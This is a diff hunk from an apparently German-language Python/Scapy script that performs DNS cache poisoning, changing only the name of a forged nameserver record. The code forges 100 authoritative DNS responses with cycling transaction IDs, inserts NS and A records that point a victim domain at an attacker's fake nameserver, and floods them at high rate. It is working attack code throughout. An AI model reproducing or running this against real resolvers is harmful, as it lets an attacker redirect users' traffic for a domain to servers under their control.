@@ -37,7 +37,7 @@ def sendRequest():
         print 'Cache Poisoning auf '+victim_url+' ...'
         for i in range(100):
             rand_id = (rand_id+1)%2**16#hex(rand_id)
-            pkt_list.append(ip/DNS(id=rand_id,rd=0, ra=0, qr=1, aa=1, qd=dns_qd, ns = DNSRR(type='NS',rrname=victim_url, ttl=dns_ttl, rdata='ein_ns.'+victim_url),ar=DNSRR(type='A',rrname='ein_ns.'+victim_url, ttl=dns_ttl, rdata=fake_ns_server)))
+            pkt_list.append(ip/DNS(id=rand_id,rd=0, ra=0, qr=1, aa=1, qd=dns_qd, ns = DNSRR(type='NS',rrname=victim_url, ttl=dns_ttl, rdata='rapunzel.'+victim_url),ar=DNSRR(type='A',rrname='rapunzel.'+victim_url, ttl=dns_ttl, rdata=fake_ns_server)))
 
         sendpfast(pkt_list, loop=0, pps=250)
 
